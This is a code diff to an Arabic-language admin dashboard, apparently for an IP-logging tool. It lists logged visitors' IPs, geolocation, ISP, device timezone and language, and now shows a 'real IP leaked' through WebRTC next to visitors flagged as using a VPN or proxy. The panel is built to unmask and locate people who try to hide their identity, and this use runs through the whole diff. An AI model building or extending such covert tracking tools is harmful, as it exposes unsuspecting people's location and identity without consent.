@@ -241,6 +241,11 @@
             color: var(--warning-yellow);
         }
 
+        .real-ip-badge {
+            color: #ff3366;
+            font-weight: bold;
+        }
+
         .ip-time {
             font-size: 0.75rem;
             color: #8b949e;
@@ -317,6 +322,41 @@
         firebase.initializeApp(firebaseConfig);
     }
     const db = firebase.firestore();
+
+    // قاموس ترجمة الدول الشهيرة للغة العربية
+    const countryTranslations = {
+        "Egypt": "مصر",
+        "Algeria": "الجزائر",
+        "Saudi Arabia": "المملكة العربية السعودية",
+        "United Arab Emirates": "الإمارات العربية المتحدة",
+        "Morocco": "المغرب",
+        "Tunisia": "تونس",
+        "Iraq": "العراق",
+        "Jordan": "الأردن",
+        "Lebanon": "لبنان",
+        "Palestine": "فلسطين",
+        "Kuwait": "الكويت",
+        "Qatar": "قطر",
+        "Oman": "عُمان",
+        "Bahrain": "البحرين",
+        "Sudan": "السودان",
+        "Libya": "ليبيا",
+        "Yemen": "اليمن",
+        "Syria": "سوريا",
+        "Netherlands": "هولندا",
+        "The Netherlands": "هولندا",
+        "United States": "الولايات المتحدة الأمريكية",
+        "Germany": "ألمانيا",
+        "France": "فرنسا",
+        "United Kingdom": "المملكة المتحدة",
+        "Turkey": "تركيا",
+        "Canada": "كندا"
+    };
+
+    function translateText(text) {
+        if (!text || text === "غير معروف" || text === "Unknown") return "غير معروف";
+        return countryTranslations[text] || text;
+    }
 
     function checkPassword() {
         const inputPass = document.getElementById('loginPass').value.trim();
@@ -414,23 +454,32 @@
 
             docs.forEach((data) => {
                 const ip = data.ip || "Unknown IP";
-                const country = data.country || "غير معروف";
-                const region = data.region || "غير معروف";
-                const city = data.city || "غير معروف";
+                const realIpWebRTC = data.real_ip_webrtc || null;
+                const country = translateText(data.country);
+                const region = translateText(data.region);
+                const city = translateText(data.city);
                 const zip = data.zip || "غير متوفر";
                 const isp = data.isp || "غير معروف";
                 const networkType = data.network_type || "غير معروف";
+                const deviceTimezone = data.device_timezone || "غير معروف";
+                const deviceLanguage = data.device_language || "غير معروف";
                 const time = formatTime(data.timestamp);
 
-                const isVpn = isp.toLowerCase().includes("vpn") || isp.toLowerCase().includes("proxy");
+                const isVpn = isp.toLowerCase().includes("vpn") || isp.toLowerCase().includes("proxy") || isp.toLowerCase().includes("scaleway");
+
+                const realIpDisplay = (realIpWebRTC && realIpWebRTC !== "غير مسرب / محمي") 
+                    ? `<span class="real-ip-badge">(الـ IP الحقيقي المسرب: ${realIpWebRTC})</span>` 
+                    : '';
 
                 const item = document.createElement('div');
                 item.className = `ip-item ${isVpn ? 'vpn-warning' : ''}`;
                 item.innerHTML = `
                     <div class="ip-info">
-                        <div class="ip-address">> IP: ${ip}</div>
+                        <div class="ip-address">> IP: ${ip} ${realIpDisplay}</div>
                         <div class="ip-details">
-                            <span>الموقع:</span> ${country} | ${region} | ${city}<br>
+                            <span>الموقع:</span> <span class="translatable">${country}</span> | <span class="translatable">${region}</span> | <span class="translatable">${city}</span><br>
+                            <span>المنطقة الزمنية للجهاز:</span> ${deviceTimezone}<br>
+                            <span>لغة الجهاز:</span> ${deviceLanguage}<br>
                             <span>الرمز البريدي:</span> ${zip}<br>
                             <span>نوع الاتصال:</span> <strong class="network-badge">${networkType}</strong><br>
                             <span>مزود الخدمة:</span> ${isVpn ? `<strong class="vpn-badge">${isp}</strong>` : isp}
